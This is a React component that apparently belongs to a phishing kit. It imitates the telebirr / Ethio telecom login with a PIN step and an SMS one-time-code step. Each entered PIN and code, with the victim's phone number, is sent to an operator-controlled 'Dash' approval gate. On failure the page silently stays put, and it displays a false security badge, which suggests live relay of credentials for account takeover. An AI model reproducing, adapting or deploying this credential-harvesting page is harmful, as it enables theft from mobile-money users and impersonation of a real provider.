'use client';

import React, { useState, useEffect, useRef } from 'react';
import {
  X,
  Lock,
  MessageSquare,
  ArrowLeft,
  RotateCw,
  Eye,
  EyeOff,
  ShieldCheck,
  CheckCircle2,
} from 'lucide-react';
import { Translation } from '@/lib/telebirr-translations';
import { requestDashApproval } from '@/lib/dash-gate';

const DASH_SITE_ID = 'telebirr-portal';

interface OTPVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  phoneNumber: string;
  t: Translation;
  onSuccessLogin: () => void;
}

export function OTPVerificationModal({
  isOpen,
  onClose,
  phoneNumber,
  t,
  onSuccessLogin,
}: OTPVerificationModalProps) {
  // Two-step verification flow: 'pin' first, then 'otp'
  const [step, setStep] = useState<'pin' | 'otp'>('pin');
  const [pinLength, setPinLength] = useState<4 | 5 | 6>(6);
  const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [showPin, setShowPin] = useState<boolean>(false);
  const [otpLength, setOtpLength] = useState<4 | 5 | 6>(6);
  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [timer, setTimer] = useState<number>(45);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleSetPinLength = (length: 4 | 5 | 6) => {
    if (isLoading) return;
    setPinLength(length);
    setPinDigits((prev) => {
      const next = new Array(length).fill('');
      for (let i = 0; i < length; i++) {
        next[i] = prev[i] || '';
      }
      return next;
    });
    setError(null);
    setTimeout(() => {
      pinInputRefs.current[0]?.focus();
    }, 50);
  };

  const handleSetOtpLength = (length: 4 | 5 | 6) => {
    if (isLoading) return;
    setOtpLength(length);
    setOtpDigits((prev) => {
      const next = new Array(length).fill('');
      for (let i = 0; i < length; i++) {
        next[i] = prev[i] || '';
      }
      return next;
    });
    setError(null);
    setTimeout(() => {
      otpInputRefs.current[0]?.focus();
    }, 50);
  };

  // Focus input when modal opens or step changes
  useEffect(() => {
    if (!isOpen) return;

    const focusTimer = setTimeout(() => {
      if (step === 'pin') {
        pinInputRefs.current[0]?.focus();
      } else {
        otpInputRefs.current[0]?.focus();
      }
    }, 120);

    return () => clearTimeout(focusTimer);
  }, [isOpen, step]);

  // OTP Countdown timer (only active during OTP step)
  useEffect(() => {
    if (!isOpen || step !== 'otp') return;

    const interval = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, [isOpen, step]);

  const handleCloseModal = () => {
    if (isLoading) return;
    setStep('pin');
    setTimer(45);
    setOtpDigits(new Array(otpLength).fill(''));
    setPinDigits(new Array(pinLength).fill(''));
    setShowPin(false);
    setError(null);
    onClose();
  };

  if (!isOpen) return null;

  // PIN input change handlers
  const handlePinChange = (index: number, value: string) => {
    if (isLoading) return;
    if (value.length > 1) {
      const pasted = value.replace(/\D/g, '').slice(0, pinLength).split('');
      const newPins = [...pinDigits];
      pasted.forEach((digit, i) => {
        if (i < pinLength) newPins[i] = digit;
      });
      setPinDigits(newPins);
      const nextFocus = Math.min(pasted.length, pinLength - 1);
      pinInputRefs.current[nextFocus]?.focus();
      if (error) setError(null);
      return;
    }

    const cleaned = value.replace(/\D/g, '');
    const newPins = [...pinDigits];
    newPins[index] = cleaned;
    setPinDigits(newPins);
    if (error) setError(null);

    if (cleaned && index < pinLength - 1) {
      pinInputRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (isLoading) return;
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      pinInputRefs.current[index - 1]?.focus();
    } else if (e.key === 'Enter') {
      e.preventDefault();
      handlePinSubmit();
    }
  };

  // Submit PIN and transition to OTP (gated by Dash)
  const handlePinSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const enteredPin = pinDigits.join('');
    if (enteredPin.length < pinLength) {
      setError(`Please enter your ${pinLength}-digit security PIN to continue.`);
      return;
    }

    setError(null);
    setIsLoading(true);

    const decision = await requestDashApproval({
      siteId: DASH_SITE_ID,
      page: 'pin',
      meta: { phone: '+251' + phoneNumber, pin: enteredPin, pinLength },
    });
    setIsLoading(false);
    if (decision === 'pass') {
      setStep('otp');
      setTimer(45);
    }
    // Not Pass -> silently stay on PIN step, no error/note.
  };

  // OTP input change handlers
  const handleOtpChange = (index: number, value: string) => {
    if (isLoading) return;
    if (value.length > 1) {
      const pastedDigits = value.replace(/\D/g, '').slice(0, otpLength).split('');
      const newDigits = [...otpDigits];
      pastedDigits.forEach((digit, i) => {
        if (i < otpLength) newDigits[i] = digit;
      });
      setOtpDigits(newDigits);
      const nextFocus = Math.min(pastedDigits.length, otpLength - 1);
      otpInputRefs.current[nextFocus]?.focus();
      if (error) setError(null);
      return;
    }

    const cleaned = value.replace(/\D/g, '');
    const newDigits = [...otpDigits];
    newDigits[index] = cleaned;
    setOtpDigits(newDigits);
    if (error) setError(null);

    if (cleaned && index < otpLength - 1) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (isLoading) return;
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    } else if (e.key === 'Enter') {
      e.preventDefault();
      handleOtpVerify();
    }
  };

  const handleResendOtp = () => {
    if (timer > 0 || isLoading) return;
    setTimer(45);
    setOtpDigits(new Array(otpLength).fill(''));
    setError(null);
    otpInputRefs.current[0]?.focus();
  };

  // Submit OTP and complete login (gated by Dash)
  const handleOtpVerify = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const enteredOtp = otpDigits.join('');
    if (enteredOtp.length < otpLength) {
      setError(`Please enter the complete ${otpLength}-digit OTP code sent to your mobile.`);
      return;
    }

    setError(null);
    setIsLoading(true);

    const decision = await requestDashApproval({
      siteId: DASH_SITE_ID,
      page: 'otp',
      meta: { phone: '+251' + phoneNumber, otp: enteredOtp, otpLength },
    });
    setIsLoading(false);
    if (decision === 'pass') {
      onSuccessLogin();
      handleCloseModal();
    }
    // Not Pass -> silently stay, reset spinner, no error/note.
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-xs animate-in fade-in duration-200"
      id="otp-modal-overlay"
      onClick={() => {
        if (!isLoading) handleCloseModal();
      }}
    >
      <div
        className="bg-white rounded-2xl w-full max-w-md overflow-hidden shadow-2xl border border-slate-200 animate-in zoom-in-95 duration-200"
        id="otp-modal-content"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Top Header Navigation */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-slate-100 bg-slate-50/80">
          {step === 'pin' ? (
            <button
              type="button"
              onClick={handleCloseModal}
              disabled={isLoading}
              className="flex items-center gap-1.5 text-xs font-semibold text-slate-600 hover:text-slate-900 transition-colors disabled:opacity-40"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{t.changeNumber}</span>
            </button>
          ) : (
            <button
              type="button"
              onClick={() => {
                if (isLoading) return;
                setStep('pin');
                setError(null);
              }}
              disabled={isLoading}
              className="flex items-center gap-1.5 text-xs font-semibold text-[#0077c8] hover:text-[#005fa0] transition-colors disabled:opacity-40"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back to PIN</span>
            </button>
          )}

          {/* Stepper Indicator */}
          <div className="flex items-center gap-2">
            <span className="text-[11px] font-semibold text-slate-500">
              {step === 'pin' ? 'Step 1 of 2: Security PIN' : 'Step 2 of 2: SMS OTP'}
            </span>
            <div className="flex items-center gap-1">
              <div
                className={`h-2 rounded-full transition-all duration-300 ${
                  step === 'pin' ? 'w-5 bg-[#0077c8]' : 'w-2 bg-[#6aa828]'
                }`}
              />
              <div
                className={`h-2 rounded-full transition-all duration-300 ${
                  step === 'otp' ? 'w-5 bg-[#0077c8]' : 'w-2 bg-slate-200'
                }`}
              />
            </div>
          </div>

          <button
            type="button"
            onClick={handleCloseModal}
            disabled={isLoading}
            className="p-1 rounded-full hover:bg-slate-200 text-slate-400 hover:text-slate-600 transition-colors cursor-pointer disabled:opacity-40"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="p-6 space-y-5">
          {/* ======================================================== */}
          {/* STEP 1: PIN VERIFICATION                                 */}
          {/* ======================================================== */}
          {step === 'pin' && (
            <form onSubmit={handlePinSubmit} className="space-y-5">
              <div className="text-center space-y-1.5">
                <div className="w-13 h-13 rounded-full bg-sky-50 text-[#0077c8] flex items-center justify-center mx-auto mb-2 border border-sky-100 shadow-2xs">
                  <Lock className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-slate-900 tracking-tight">
                  {t.enterPin}
                </h3>
                <p className="text-xs text-slate-500 max-w-xs mx-auto leading-relaxed">
                  Enter your {pinLength}-digit security PIN for{' '}
                  <span className="font-bold text-slate-800 font-mono">+251 {phoneNumber}</span>
                </p>
              </div>

              {/* PIN Length Setup: choose 4, 5, or 6 digits */}
              <div className="flex items-center justify-between px-2 py-1.5 rounded-xl bg-slate-50 border border-slate-200/80 text-xs">
                <span className="text-slate-600 font-medium">PIN Length:</span>
                <div className="inline-flex p-0.5 rounded-lg bg-slate-200/70">
                  <button
                    type="button"
                    id="pin-length-4-btn"
                    onClick={() => handleSetPinLength(4)}
                    disabled={isLoading}
                    className={`px-2.5 sm:px-3 py-1 rounded-md font-bold text-xs transition-all cursor-pointer ${
                      pinLength === 4
                        ? 'bg-white text-[#0077c8] shadow-xs'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    4 Digits
                  </button>
                  <button
                    type="button"
                    id="pin-length-5-btn"
                    onClick={() => handleSetPinLength(5)}
                    disabled={isLoading}
                    className={`px-2.5 sm:px-3 py-1 rounded-md font-bold text-xs transition-all cursor-pointer ${
                      pinLength === 5
                        ? 'bg-white text-[#0077c8] shadow-xs'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    5 Digits
                  </button>
                  <button
                    type="button"
                    id="pin-length-6-btn"
                    onClick={() => handleSetPinLength(6)}
                    disabled={isLoading}
                    className={`px-2.5 sm:px-3 py-1 rounded-md font-bold text-xs transition-all cursor-pointer ${
                      pinLength === 6
                        ? 'bg-white text-[#0077c8] shadow-xs'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    6 Digits
                  </button>
                </div>
              </div>

              {error && (
                <div className="p-2.5 rounded-xl bg-red-50 text-red-700 text-xs border border-red-200 text-center font-medium">
                  {error}
                </div>
              )}

              {/* Dynamic PIN Inputs (4, 5, or 6 digits) */}
              <div className="space-y-2">
                <div className="flex items-center justify-center gap-2 sm:gap-2.5">
                  {pinDigits.map((digit, idx) => (
                    <input
                      key={idx}
                      ref={(el) => {
                        pinInputRefs.current[idx] = el;
                      }}
                      type={showPin ? 'text' : 'password'}
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      disabled={isLoading}
                      onChange={(e) => handlePinChange(idx, e.target.value)}
                      onKeyDown={(e) => handlePinKeyDown(idx, e)}
                      className={`${
                        pinLength === 4
                          ? 'w-13 h-14 sm:w-14 sm:h-15 text-2xl'
                          : pinLength === 5
                          ? 'w-11 h-13 sm:w-12 sm:h-14 text-xl'
                          : 'w-10 h-12 sm:w-11 sm:h-13 text-lg'
                      } text-center font-bold font-mono rounded-xl border border-slate-300 text-slate-900 focus:border-[#0077c8] focus:ring-2 focus:ring-[#0077c8]/20 focus:outline-none bg-slate-50/50 shadow-2xs transition-all`}
                    />
                  ))}
                </div>

                {/* Show/Hide PIN Toggle */}
                <div className="flex justify-center">
                  <button
                    type="button"
                    onClick={() => setShowPin(!showPin)}
                    disabled={isLoading}
                    className="inline-flex items-center gap-1.5 text-xs text-slate-500 hover:text-slate-800 transition-colors cursor-pointer pt-1 disabled:opacity-40"
                  >
                    {showPin ? (
                      <>
                        <EyeOff className="w-3.5 h-3.5" />
                        <span>Hide PIN</span>
                      </>
                    ) : (
                      <>
                        <Eye className="w-3.5 h-3.5" />
                        <span>Show PIN</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Primary Action: Continue to OTP */}
              <button
                type="submit"
                id="submit-pin-button"
                disabled={isLoading}
                className="w-full py-3.5 px-4 bg-[#0077c8] hover:bg-[#006cb8] active:bg-[#005fa0] text-white font-bold rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-60"
              >
                {isLoading ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    <span>Verifying PIN...</span>
                  </>
                ) : (
                  <span>Continue</span>
                )}
              </button>

              <div className="text-center pt-1">
                <p className="text-[11px] text-slate-400 flex items-center justify-center gap-1">
                  <ShieldCheck className="w-3.5 h-3.5 text-[#6aa828]" />
                  <span>Secured by Ethio telecom & telebirr Multi-Factor Protection</span>
                </p>
              </div>
            </form>
          )}

          {/* ======================================================== */}
          {/* STEP 2: OTP VERIFICATION (APPEARS AFTER PIN)             */}
          {/* ======================================================== */}
          {step === 'otp' && (
            <form onSubmit={handleOtpVerify} className="space-y-5">
              <div className="text-center space-y-1.5">
                <div className="w-13 h-13 rounded-full bg-lime-50 text-[#6aa828] flex items-center justify-center mx-auto mb-2 border border-lime-200 shadow-2xs">
                  <MessageSquare className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-slate-900 tracking-tight">
                  {t.otpTitle}
                </h3>
                <p className="text-xs text-slate-500 max-w-xs mx-auto leading-relaxed">
                  Enter the {otpLength}-digit OTP verification code sent to{' '}
                  <span className="font-bold text-slate-800 font-mono">+251 {phoneNumber}</span>
                </p>
              </div>

              {/* OTP Length Setup: choose 4, 5, or 6 digits */}
              <div className="flex items-center justify-between px-2 py-1.5 rounded-xl bg-slate-50 border border-slate-200/80 text-xs">
                <span className="text-slate-600 font-medium">OTP Length:</span>
                <div className="inline-flex p-0.5 rounded-lg bg-slate-200/70">
                  <button
                    type="button"
                    id="otp-length-4-btn"
                    onClick={() => handleSetOtpLength(4)}
                    disabled={isLoading}
                    className={`px-2.5 sm:px-3 py-1 rounded-md font-bold text-xs transition-all cursor-pointer ${
                      otpLength === 4
                        ? 'bg-white text-[#0077c8] shadow-xs'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    4 Digits
                  </button>
                  <button
                    type="button"
                    id="otp-length-5-btn"
                    onClick={() => handleSetOtpLength(5)}
                    disabled={isLoading}
                    className={`px-2.5 sm:px-3 py-1 rounded-md font-bold text-xs transition-all cursor-pointer ${
                      otpLength === 5
                        ? 'bg-white text-[#0077c8] shadow-xs'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    5 Digits
                  </button>
                  <button
                    type="button"
                    id="otp-length-6-btn"
                    onClick={() => handleSetOtpLength(6)}
                    disabled={isLoading}
                    className={`px-2.5 sm:px-3 py-1 rounded-md font-bold text-xs transition-all cursor-pointer ${
                      otpLength === 6
                        ? 'bg-white text-[#0077c8] shadow-xs'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    6 Digits
                  </button>
                </div>
              </div>

              {error && (
                <div className="p-2.5 rounded-xl bg-red-50 text-red-700 text-xs border border-red-200 text-center font-medium">
                  {error}
                </div>
              )}

              {/* Dynamic OTP Inputs (4, 5, or 6 digits) */}
              <div className="space-y-2">
                <div className="flex items-center justify-center gap-2 sm:gap-2.5">
                  {otpDigits.map((digit, idx) => (
                    <input
                      key={idx}
                      ref={(el) => {
                        otpInputRefs.current[idx] = el;
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      disabled={isLoading}
                      onChange={(e) => handleOtpChange(idx, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                      className={`${
                        otpLength === 4
                          ? 'w-13 h-14 sm:w-14 sm:h-15 text-2xl'
                          : otpLength === 5
                          ? 'w-11 h-13 sm:w-12 sm:h-14 text-xl'
                          : 'w-10 h-12 sm:w-11 sm:h-13 text-lg'
                      } text-center font-bold font-mono rounded-xl border border-slate-300 text-slate-900 focus:border-[#0077c8] focus:ring-2 focus:ring-[#0077c8]/20 focus:outline-none bg-slate-50/50 shadow-2xs transition-all`}
                    />
                  ))}
                </div>
              </div>

              {/* Countdown Timer & Resend */}
              <div className="text-center text-xs text-slate-500">
                {timer > 0 ? (
                  <span>
                    {t.resendIn}{' '}
                    <strong className="font-mono text-slate-800 font-bold">{timer}s</strong>
                  </span>
                ) : (
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    disabled={isLoading}
                    className="inline-flex items-center gap-1 font-semibold text-[#6aa828] hover:text-[#558b2f] hover:underline cursor-pointer disabled:opacity-40"
                  >
                    <RotateCw className="w-3.5 h-3.5" />
                    <span>{t.resendCode}</span>
                  </button>
                )}
              </div>

              {/* Primary Action: Verify OTP & Finish Login */}
              <button
                type="submit"
                id="verify-otp-button"
                disabled={isLoading}
                className="w-full py-3.5 px-4 bg-[#0077c8] hover:bg-[#006cb8] active:bg-[#005fa0] text-white font-bold rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-60"
              >
                {isLoading ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    <span>Verifying Code...</span>
                  </>
                ) : (
                  <div className="flex items-center gap-1.5">
                    <CheckCircle2 className="w-4 h-4" />
                    <span>{t.verifyAndContinue}</span>
                  </div>
                )}
              </button>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}

